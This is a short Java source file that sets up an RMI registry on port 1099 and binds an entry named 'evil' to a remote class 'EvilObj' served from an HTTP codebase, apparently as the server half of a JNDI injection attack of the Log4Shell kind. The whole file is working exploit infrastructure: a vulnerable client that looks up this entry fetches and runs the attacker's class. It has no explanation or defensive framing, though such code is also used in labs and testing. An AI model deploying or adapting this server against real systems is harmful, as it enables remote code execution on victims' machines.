import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @description: TODO
 * @author: invoker.lee
 * @date: 2021/12/26 11:00
 * @version: v1.0
 */
public class RmiServer {
    public static void main(String[] args) {

        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();

            System.out.println("create rmi register on port 1099");

            registry.bind("evil",new ReferenceWrapper(
                    new Reference(null,"EvilObj","http://127.0.0.1:80/")));

        }catch (Exception e) {
            e.printStackTrace();
        }

    }
}
